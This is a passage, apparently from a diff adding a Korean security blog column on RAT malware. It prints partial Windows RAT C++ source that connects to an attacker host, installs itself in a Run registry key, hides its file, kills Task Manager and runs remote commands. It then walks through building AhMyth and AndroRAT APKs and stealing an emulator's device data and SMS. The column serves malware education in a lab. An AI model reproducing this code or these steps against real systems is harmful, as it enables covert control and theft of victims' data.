class="meta">#<span class="keyword">define</span> KEY_NON_ADMIN_TARGET HKEY_CURRENT_USER</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_STARTUP <span class="string">&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_NON_ADMIN_STARTUP </span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">t_ping</span><span class="params">(LPVOID lpParams)</span></span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">t_payloads</span><span class="params">(LPVOID lpParams)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//코드 생략</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;shell32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Advapi32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Wininet.lib&quot;</span>)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>헤더 파일과 필요한 라이브러리 링크. 프로그램에서 사용할 상수를 정의함. </p>
+<h3 id="b-클라이언트-연결-설정"><a href="#b-클라이언트-연결-설정" class="headerlink" title="b. 클라이언트 연결 설정"></a>b. 클라이언트 연결 설정</h3><p>main 함수 부분이다. 원격 서버와 연결하는 역할을 하며, 명령줄 인수로 IP와 포트를 받아 서버에 연결한다.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(cli::array&lt;System::String^&gt;^ args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (args-&gt;Length &lt; <span class="number">2</span>) <span class="comment">// IP and Port;</span></span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line"></span><br><span class="line">str_host = (<span class="type">const</span> <span class="type">char</span> * ) Marshal::<span class="built_in">StringToHGlobalAnsi</span>(args[<span class="number">0</span>]).<span class="built_in">ToPointer</span>();</span><br><span class="line">    str_port = (<span class="type">const</span> <span class="type">char</span> * ) Marshal::<span class="built_in">StringToHGlobalAnsi</span>(args[<span class="number">1</span>]).<span class="built_in">ToPointer</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (코드 생략)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>( client.<span class="built_in">init</span>(str_host, str_port, TCP_SERVER, onClientConnect) ) </span><br><span class="line">            client.<span class="built_in">listen</span>(onClientRecData, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (client.Socket_Client != INVALID_SOCKET)</span><br><span class="line">            <span class="built_in">closesocket</span>(client.Socket_Client);</span><br><span class="line"></span><br><span class="line">        b_cmd = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="c-파일-경로-및-실행-파일-복사"><a href="#c-파일-경로-및-실행-파일-복사" class="headerlink" title="c. 파일 경로 및 실행 파일 복사"></a>c. 파일 경로 및 실행 파일 복사</h3><p>현재 실행 중인 파일의 경로를 얻고, 이를 시스템 디렉토리나 임시 디렉토리에 복사한다. ‘ShellExecute’를 사용해 새 경로에서 프로그램을 재실행한다.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HMODULE h_mod;</span><br><span class="line"><span class="type">char</span> * c_path[MAX_PATH];</span><br><span class="line"><span class="type">char</span> c_new_path[MAX_PATH + FILENAME_MAX + <span class="number">1</span>];</span><br><span class="line">string s_path;</span><br><span class="line">string s_file_name;</span><br><span class="line"><span class="type">bool</span> b_admin_access;</span><br><span class="line"></span><br><span class="line">h_mod = <span class="built_in">GetModuleHandleW</span>(<span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">GetModuleFileNameA</span>(h_mod, (<span class="type">char</span> *)c_path, MAX_PATH);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 코드 생략</span></span><br><span class="line">&#123; (... ...)</span><br><span class="line">    <span class="type">char</span> paramFormat[<span class="number">23</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(paramFormat, <span class="string">&quot;%s %s&quot;</span>, str_host, str_port);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ShellExecute</span>(<span class="literal">NULL</span>, <span class="string">&quot;open&quot;</span>, c_new_path, paramFormat, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="d-레지스트리에-추가"><a href="#d-레지스트리에-추가" class="headerlink" title="d. 레지스트리에 추가"></a>d. 레지스트리에 추가</h3><p>레지스트리에 프로그램을 추가하여 부팅 시 자동으로 실행되도록 설정한다. 관리자 권한이 없으면 사용자 레지스트리에 추가한다.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HKEY h_key;</span><br><span class="line"><span class="type">long</span> l_key;</span><br><span class="line"><span class="type">bool</span> b_good;</span><br><span class="line"></span><br><span class="line">l_key = <span class="built_in">RegOpenKeyEx</span>(KEY_TARGET, KEY_ROOT_STARTUP, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;h_key);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 코드 생략</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (l_key == ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="type">char</span> * full_path = <span class="keyword">new</span> <span class="type">char</span>[MAX_PATH + <span class="number">50</span>];</span><br><span class="line">        <span class="built_in">sprintf</span>(full_path, <span class="string">&quot;\&quot;%s\&quot; %s %s&quot;</span>, c_path, str_host, str_port);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">RegSetValueEx</span>(h_key, KEY_VALUE_NAME, <span class="number">0</span>, REG_SZ, (LPBYTE)full_path, MAX_PATH);</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(h_key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">SetFileAttributes</span>((<span class="type">char</span> *)c_path, FILE_ATTRIBUTE_HIDDEN);</span><br></pre></td></tr></table></figure>
+
+<h3 id="e-명령-실행-및-제어"><a href="#e-명령-실행-및-제어" class="headerlink" title="e. 명령 실행 및 제어"></a>e. 명령 실행 및 제어</h3><p>‘t_payloads’ 스레드는 특정 프로세스를 종료하여 task 매니저를 비활성화할 수 있다. ‘t_ping’ 스레드는 서버와의 연결 상태를 주기적으로 확인한다.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">t_payloads</span><span class="params">(LPVOID lpParams)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (b_taskmgr) &#123;</span><br><span class="line">            DWORD d_task = <span class="built_in">FindProcessId</span>(<span class="string">L&quot;taskmgr.exe&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (d_task != <span class="number">0</span>) &#123;</span><br><span class="line">                HANDLE h_process = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, TRUE, d_task);</span><br><span class="line">                <span class="built_in">TerminateProcess</span>(h_process, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">t_ping</span><span class="params">(LPVOID lpParams)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line">        <span class="type">char</span> buf;</span><br><span class="line">        <span class="type">int</span> err = <span class="built_in">recv</span>(client.Socket_Client, &amp;buf, <span class="number">1</span>, MSG_PEEK);</span><br><span class="line">        <span class="keyword">if</span> (err == SOCKET_ERROR)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">WSAGetLastError</span>() != WSAEWOULDBLOCK)</span><br><span class="line">            &#123;</span><br><span class="line">                client.<span class="built_in">close</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="f-명령어-처리"><a href="#f-명령어-처리" class="headerlink" title="f. 명령어 처리"></a>f. 명령어 처리</h3><p>특정 명령어를 처리해서 cmd응답을 toggle하거나, task 매니저 비활성화 기능을 설정한다. 일반 명령어는 cmd.exe를 통해 실행하고 결과를 서버로 전송한다.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">onClientRecData</span><span class="params">(<span class="type">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Removing encryption.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(data, <span class="string">&quot;CMD&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        string s_data = data;</span><br><span class="line">        s_data = <span class="built_in">unencryptCMD</span>(s_data);</span><br><span class="line">        <span class="built_in">strcpy</span>(data, s_data.<span class="built_in">data</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> i_len = <span class="built_in">strlen</span>(data) + MAX_PATH + <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> *c_output = <span class="keyword">new</span> <span class="type">char</span>[i_len];</span><br><span class="line">    <span class="type">char</span> *c_new_data = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(data) + <span class="number">1</span>];</span><br><span class="line">    <span class="type">bool</span> b_skip = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(c_new_data, data);</span><br><span class="line">    c_output[i_len - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(c_new_data, <span class="string">&quot;ghost_ping&quot;</span>))</span><br><span class="line">        b_skip = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(c_new_data, <span class="string">&quot;ghost_tskmgr&quot;</span>)) &#123;</span><br><span class="line">        b_taskmgr = !b_taskmgr;</span><br><span class="line">        client.<span class="built_in">send_data</span>(<span class="built_in">encryptCMD</span>(<span class="built_in">string</span>(b_taskmgr ? <span class="string">&quot;Task Manager Killer Enabled&quot;</span> : <span class="string">&quot;Task Manager Killer Disabled&quot;</span>)).<span class="built_in">c_str</span>());</span><br><span class="line">        b_skip = <span class="literal">true</span>; <span class="comment">// Nullifying by using the magical keyword</span></span><br><span class="line">    &#125;</span><br><span class="line">…..</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="7-Android-RAT"><a href="#7-Android-RAT" class="headerlink" title="7. Android RAT"></a>7. Android RAT</h1><p>Android RAT은 Android와 RAT의 합성어로, 안드로이드를 대상으로 한 RAT 악성코드를 통칭한다. 이러한 멀웨어가 안드로이드 기기에 침투하는 과정은 주로 다음과 같다;<br>피해자들은 FaceBook과 같은 대형 플랫폼을 통해 광고에 노출되고, 해당 광고는 피해자가 비공식 앱 스토어에서 APK를 다운로드하도록 유도한다. 해당 앱이 설치되어 활성화되면 Android 기기를 완전히 액세스하고 제어할 수 있게 된다. </p>
+<h1 id="8-AhMyth"><a href="#8-AhMyth" class="headerlink" title="8. AhMyth"></a>8. AhMyth</h1><h2 id="8-1-개요"><a href="#8-1-개요" class="headerlink" title="8-1. 개요"></a>8-1. 개요</h2><p>AhMyth는 원격 액세스 트로이목마(RAT)로 작동하는 Android Malware 변종이다. 일반적으로 합법적인 앱으로 가장하여 사용자의 디바이스에 침투한다.<br>교육 목적으로 Github에 배포되었지만 사이버 범죄자들에 의해 Android 디바이스의 민감한 정보를 훔치기 위하여 악용된 이력이 있다. </p>
+<h2 id="8-2-AhMyth-악성코드-실습-과정-정리"><a href="#8-2-AhMyth-악성코드-실습-과정-정리" class="headerlink" title="8-2. AhMyth 악성코드 실습 과정 정리"></a>8-2. AhMyth 악성코드 실습 과정 정리</h2><ol>
+<li>가상머신 환경 구성 (AndroidRAT 악성 서버로 사용할 환경)</li>
+<li>AhMyth_Win32.exe 파일 다운 (java 7 환경이 필요)</li>
+<li>exe 파일의 API Builder에서 IP, Port 설정 후 APK 제작</li>
+</ol>
+<p>제작된 APK 파일은 호스트 PC로 이동한 후 감염시킬 에뮬레이터 환경으로 옮기면 감염시킬 수 있다. </p>
+<p>본 칼럼에서는 두 개의 실습을 진행하기 때문에 에뮬레이터로 옮겨 확인하는 것은 두 번째 실습에서만 진행하도록 하겠다. 먼저 AhMyth 악성코드로 APK 파일을 생성해 보자. </p>
+<h2 id="8-3-AhMyth-실습-APK-파일-제작"><a href="#8-3-AhMyth-실습-APK-파일-제작" class="headerlink" title="8-3. AhMyth 실습 (APK 파일 제작)"></a>8-3. AhMyth 실습 (APK 파일 제작)</h2><p><img src="/images/313203_251004_image18.png" alt="그림 102. AhMyth Android RAT Assets 섹션"></p>
+<center><span style="font-size: 90%;">그림 102. [Ahmyth Android RAT Assets 섹션] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>가상머신의 인터넷에 접속한 뒤 AhMyth의 깃허브에서 AhMyth_Win32.exe를 다운로드했다. </p>
+<p><img src="/images/313203_251004_image19.png" alt="그림 103. 설치된 이후 실행된 모습"></p>
+<center><span style="font-size: 90%;">그림 103. [설치된 이후 실행된 모습] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>실행에는 JRE 환경이 필요하다. 또한 APKBuilder를 이용할 때, 자바 환경을 맞춰줘야 build를 할 수 있기 때문에 JAVA 7을 설치했다. </p>
+<p><img src="/images/313203_251004_image20.png" alt="그림 104. java7 검색 화면"></p>
+<center><span style="font-size: 90%;">그림 104. [java7 검색 화면] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>마찬가지로 가상머신 내에서 위에 보이는 Oracle 홈페이지의 runtime용 Windows x86 Offline 파일을 다운로드 받았다. JDK는 필요치 않으므로 생략한다. </p>
+<p><img src="/images/313203_251004_image21.png" alt="그림 105. 설치 완료 화면"></p>
+<center><span style="font-size: 90%;">그림 105. [설치 완료 화면] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>이후 시스템 환경 변수 편집을 거쳐 설치를 완료했다. </p>
+<p>APKBuilder에 입력할 정보를 위해 ipconfig 명령어로 필요한 정보를 확인했다. </p>
+<p><img src="/images/313203_251004_image22.png" alt="그림 106. IP 확인"></p>
+<center><span style="font-size: 90%;">그림 106. [IP 확인] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>이제 AhMyth 설치 파일을 열어보자. </p>
+<p><img src="/images/313203_251004_image23.png" alt="그림 107. APK Builder 생성 과정"></p>
+<center><span style="font-size: 90%;">그림 107. [APK Builder 생성 과정] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>이렇게 나의 IPv4의 주소를 SourceIP에 써주고 포트는 디폴트값인 42474로 설정한 뒤 Build했다. </p>
+<p><img src="/images/313203_251004_image24.png" alt="그림 108. APK 파일 설치 완료된 모습"></p>
+<center><span style="font-size: 90%;">그림 108. [APK 파일 설치 완료된 모습] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p><img src="/images/313203_251004_image25.png" alt="그림 109. APK 파일이 저장된 모습"></p>
+<center><span style="font-size: 90%;">그림 108. [APK 파일이 저장된 모습] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>이렇게 악성 APk 파일이 완성되었으며, 해당 파일은 에뮬레이터나 녹스 앱플레이어 등에서 사용이 가능하다. </p>
+<h2 id="8-4-AndroRAT-from-Karma9874-실습"><a href="#8-4-AndroRAT-from-Karma9874-실습" class="headerlink" title="8-4. AndroRAT (from. Karma9874) 실습"></a>8-4. AndroRAT (from. Karma9874) 실습</h2><p>AndroRAT는 안드로이드 시스템을 원격으로 제어하고 정보를 검색하도록 설계된 도구이다.</p>
+<p>AndroRAT는 클라이언트 측을 위해 Java Android로 개발된 클라이언트&#x2F;서버 애플리케이션이고, Python 서버를 사용한다. 그러나 본 칼럼에서는 리눅스 환경에서 진행해 볼 예정이다.</p>
+<p>리눅스 환경의 루트 터미널에서 karma9874의 androidRAT을 clone한다. </p>
+<p><img src="/images/313203_251004_image26.png" alt="그림 110. Git clone하는 모습"></p>
+<center><span style="font-size: 90%;">그림 110. [Git clone하는 모습] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p><img src="/images/313203_251004_image27.png" alt="그림 111. Clone 이후 ls 명령어로 확인해 본 모습"></p>
+<center><span style="font-size: 90%;">그림 111. [Clone 이후 ls 명령어로 확인해 본 모습] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+
+<p><img src="/images/313203_251004_image28.png" alt="그림 112. Requirements.txt 확인"></p>
+<center><span style="font-size: 90%;">그림 112. [Requirements.txt 확인] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+
+<p>이후 requirements.txt를 install하고 cat으로 내용을 출력한다. pyngrok이라고 적혀 있다. </p>
+<p><img src="/images/313203_251004_image29.png" alt="그림 113. ifconfig로 ip 주소를 확인하는 모습"></p>
+<center><span style="font-size: 90%;">그림 113. [ifconfig로 ip 주소를 확인하는 모습] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+
+<p><img src="/images/313203_251004_image30.png" alt="그림 114. APK build"></p>
+<center><span style="font-size: 90%;">그림 114. [APK build] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>위와 같이 명령어를 작성해 APK를 빌드한다. </p>
+<p><img src="/images/313203_251004_image31.png" alt="그림 115. ls -lt 명령어로 hackerloi.apk 툴 생성 확인"></p>
+<center><span style="font-size: 90%;">그림 115. [ls -lt 명령어로 hackerloi.apk 툴 생성 확인] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p><img src="/images/313203_251004_image32.png" alt="그림 116. AndroRAT 연결"></p>
+<center><span style="font-size: 90%;">그림 116. [AndroRAT 연결] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>이후 ifconfig로 미리 ip 주소를 확인한 다른 터미널로 이동하여 아파치 서버를 세팅한다. </p>
+<p><img src="/images/313203_251004_image33.png" alt="그림 117. Apache2.service 세팅(1)"></p>
+<center><span style="font-size: 90%;">그림 117. [Apache2.service 세팅(1)] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p><img src="/images/313203_251004_image34.png" alt="그림 118. Apache2.service 세팅(2)"></p>
+<center><span style="font-size: 90%;">그림 118. [Apache2.service 세팅(2)] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p><img src="/images/313203_251004_image35.png" alt="그림 119. 세팅 완료"></p>
+<center><span style="font-size: 90%;">그림 119. [세팅 완료] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>이로써 hackerloi.apk 빌딩 및 Apache 서버 사전준비를 완료했다. 이제 안드로이드 에뮬레이터에서 해당 apk를 실제로 다운로드 받아보자. </p>
+<p><img src="/images/313203_251004_image36.png" alt="그림 120. 안드로이드 에뮬레이터에서 url 입력"></p>
+<center><span style="font-size: 90%;">그림 120. [안드로이드 에뮬레이터에서 url 입력] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+
+<p><img src="/images/313203_251004_image37.png" alt="그림 121. Apk 파일 다운로드(1)"></p>
+<center><span style="font-size: 90%;">그림 121. [Apk 파일 다운로드(1)] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p><img src="/images/313203_251004_image38.png" alt="그림 122. Apk 파일 다운로드(2)"></p>
+<center><span style="font-size: 90%;">그림 122. [Apk 파일 다운로드(2)] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+
+<p><img src="/images/313203_251004_image39.png" alt="그림 123. Apk 파일 오픈 - 권한 전부 허용"></p>
+<center><span style="font-size: 90%;">그림 123. [Apk 파일 오픈 - 권한 전부 허용] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>APK를 다운로드 받은 뒤 요청 권한을 전부 허용했다. 이후 아까의 터미널로 돌아오면 아래의 사진처럼 쉘이 바뀌어 있는데, 이제 해당 쉘에서 디바이스 제어가 가능함을 의미한다.</p>
+<p><img src="/images/313203_251004_image40.png" alt="그림 124. 공격자 PC의 화면"></p>
+<center><span style="font-size: 90%;">그림 124. [공격자 PC의 화면] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>이제 본격적으로 에뮬레이터 기기의 정보를 탈취하고 조종해 보자. </p>
+<p><img src="/images/313203_251004_image41.png" alt="그림 125. 명령어 확인"></p>
+<center><span style="font-size: 90%;">그림 125. [명령어 확인] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>help 명령어를 통해 쓸 수 있는 명령어 리스트를 확인했다. <code>deviceInfo</code>로 디바이스의 정보를 알아보고, <code>camList</code>로 카메라 ID를 받아오는 등 다양한 기능이 있다. 비디오&#x2F;오디오 조작, sms 메시지 받아오기 등 중요한 개인정보는 전부 접근 가능한 것으로 보인다. </p>
+<p><img src="/images/313203_251004_image42.png" alt="그림 126. 사진 관련 명령어 실행"></p>
+<center><span style="font-size: 90%;">그림 126. [사진 관련 명령어 실행] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p><code>camList</code>로 카메라 ID 반환. <code>takepic</code>은 에뮬레이터라 카메라와 연결하지 못 해 작동하지 않았다. </p>
+<p><img src="/images/313203_251004_image43.png" alt="그림 127. 디바이스 정보 출력"></p>
+<center><span style="font-size: 90%;">그림 127. [디바이스 정보 출력] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p><code>deviceinfo</code>로 디바이스 정보를 출력한다. </p>
+<p><img src="/images/313203_251004_image44.png" alt="그림 128. 디바이스 IP 정보"></p>
+<center><span style="font-size: 90%;">그림 128. [디바이스 IP 정보] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p><code>getIP</code>로 해당 디바이스의 IP 주소를 얻어왔다. 당연한 말이지만 이 정보는 공격에 악용할 수 있다. </p>
+<p><img src="/images/313203_251004_image45.png" alt="그림 129. SMS 가져오기 기능"></p>
+<center><span style="font-size: 90%;">그림 129. [SMS 가져오기 기능] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>SMS 역시 받아와 &#x2F;root&#x2F;AndroRAT&#x2F;Dumps에 저장해 놓았다. root 폴더가 보이지 않아 아래와 같이 권한 허용을 해주고 나니 root 폴더 열람이 가능해졌다. </p>
+<p><img src="/images/313203_251004_image46.png" alt="그림 130. 권한 허용"></p>
+<center><span style="font-size: 90%;">그림 130. [권한 허용] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>폴더 안으로 이동하자 SMS 발&#x2F;수신 로그를 담은 txt 파일이 있었다. </p>
+<p><img src="/images/313203_251004_image47.png" alt="그림 131. 메시지 내용 확인"></p>
+<center><span style="font-size: 90%;">그림 131. [권한 허용] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>inbox&#x2F;sent 모두 결과는 END123으로 동일했다. 에뮬레이터다 보니 발&#x2F;수신한 메시지 기록이 없어서 이런 예시 문자열만 뜬 것으로 보인다. </p>
+<p><img src="/images/313203_251004_image48.png" alt="그림 132. 연락처 정보"></p>
+<center><span style="font-size: 90%;">그림 132. [연락처 정보] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>마지막으로 <code>getCallLogs</code>로 디바이스의 연락처를 수집하였으나, 에뮬레이터에 연락처가 저장되어있지 않은 관계로 해당 정보가 존재하지 않는다는 메시지를 돌려받았다. </p>
+<p>실습은 이렇게 마무리하겠다. </p>
+<h1 id="9-나가는-말"><a href="#9-나가는-말" class="headerlink" title="9. 나가는 말"></a>9. 나가는 말</h1><p> 본 칼럼을 통해 다양한 안드로이드 악성코드에 대해 분석하고, 그 동작 방식과 위협 요소를 살펴보았다. 특히 RAT 악성코드는 단순한 정보 탈취를 넘어 원격 제어가 가능하다는 점에서 심각한 보안 위협을 초래한다는 점 역시 알게 되었다. </p>
+<p> 이러한 악성코드로부터 디바이스를 보호하기 위해서는 기존의 보안 수칙을 반드시 준수해야 한다. 앞으로도 악성코드는 지속적으로 발전하며 더욱 정교해질 것이다. 이를 예방하고 대응하기 위해서는 끊임없는 보안 의식과 관심이 필요하다. 본 칼럼이 안드로이드 악성코드에 대한 이해를 높이는 데 도움이 되었기를 바라며, 보안의 중요성을 다시 한번 강조하며 마무리하도록 하겠다.</p>
+<h1 id="10-참고문헌"><a href="#10-참고문헌" class="headerlink" title="10. 참고문헌"></a>10. 참고문헌</h1><ul>
+<li><p>The Evolution of Android Malware and Android Analysis Techniques . (2017). <span class="exturl" data-url="aHR0cHM6Ly93d3cucmVzZWFyY2hnYXRlLm5ldC9wdWJsaWNhdGlvbi8zMTIzNzY4NjJfVGhlX0V2b2x1dGlvbl9vZl9BbmRyb2lkX01hbHdhcmVfYW5kX0FuZHJvaWRfQW5hbHlzaXNfVGVjaG5pcXVlcw==">https://www.researchgate.net/publication/312376862_The_Evolution_of_Android_Malware_and_Android_Analysis_Techniques</span>.</p>
+</li>
+<li><p>McAfee 2023 Consumer Mobile Threat Report . (2023). <span class="exturl" data-url="aHR0cHM6Ly93d3cubWNhZmVlLmNvbS9ibG9ncy9pbnRlcm5ldC1zZWN1cml0eS9tY2FmZWUtMjAyMy1jb25zdW1lci1tb2JpbGUtdGhyZWF0LXJlcG9ydC8=">https://www.mcafee.com/blogs/internet-security/mcafee-2023-consumer-mobile-threat-report/</span>.</p>
+</li>
+<li><p>Global mobile banking malware grows 32 percent in 2023 . (2024). <span class="exturl" data-url="aHR0cHM6Ly93d3cua2FzcGVyc2t5LmNvbS9hYm91dC9wcmVzcy1yZWxlYXNlcy9nbG9iYWwtbW9iaWxlLWJhbmtpbmctbWFsd2FyZS1ncm93cy0zMi1wZXJjZW50LWluLTIwMjM=">https://www.kaspersky.com/about/press-releases/global-mobile-banking-malware-grows-32-percent-in-2023</span>.</p>
+</li>
